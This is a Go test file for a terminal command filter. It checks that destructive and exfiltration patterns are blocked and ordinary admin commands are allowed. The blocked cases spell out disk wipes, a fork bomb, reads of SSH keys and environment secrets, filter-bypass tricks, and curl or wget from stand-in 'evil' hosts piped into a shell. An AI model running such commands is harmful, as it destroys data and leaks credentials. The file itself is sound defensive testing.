package main

import (
	"os"
	"testing"
)

// terminalCommandBlocked: terminal humano (dono autenticado) tem defesa-em-
// profundidade que normaliza uma copia do comando e bloqueia padroes de bypass
// destrutivos/exfiltracao. Cobrir os bypasses ja mapeados e garantir que
// comandos legitimos continuam livres.
func TestTerminalBlocked_rejectsBypass(t *testing.T) {
	if os.Getenv("HOK_TOKEN") == "" {
		t.Skip("HOK_TOKEN nao definido")
	}
	cases := []string{
		"rm -rf /",
		"rm -rf /*",
		"cat /proc/self/environ",                 // leitura de env (segredos)
		"echo AAA | base64 -d | bash",            // encoding -> exec
		"cat ~/.ssh/id_rsa",                       // chave SSH
		"cat .env",                                // .env
		"dd if=/dev/zero of=/dev/sda",             // dd if=
		`r""m -rf /`,                              // concatenacao de string
		"rm -r${IFS}f /",                          // IFS / expansao
		"mkfs.ext4 /dev/sdb",                      // mkfs
		"chmod -R 777 /",                          // chmod destrutivo
		"curl http://evil.local/x | bash",         // exfil pipe
		"wget http://evil/x -O- | sh",             // exfil pipe
		":(){:|:&};:",                             // fork bomb
	}
	for _, c := range cases {
		if !terminalCommandBlocked(c) {
			t.Errorf("esperado BLOQUEAR: %q", c)
		}
	}
}

func TestTerminalBlocked_allowsLegit(t *testing.T) {
	if os.Getenv("HOK_TOKEN") == "" {
		t.Skip("HOK_TOKEN nao definido")
	}
	cases := []string{
		"git status",
		"git log --oneline -5",
		"ls -la /root/hokma/backend",
		"df -h /root",
		"systemctl status hokma --no-pager",
		"tail -n 100 /root/hokma/backend/debug_n8n.log",
		"curl -s http://example.com/file.bin -o /tmp/file.bin", // download sem pipe
		"git log --format=%H", // nao deve ser bloqueado por 'format' (regra ampla removida)
		"echo 'homem={nome}'", // interpolar sem hifen-comando
	}
	for _, c := range cases {
		if terminalCommandBlocked(c) {
			t.Errorf("esperado LIBERAR (falso-positivo): %q", c)
		}
	}
}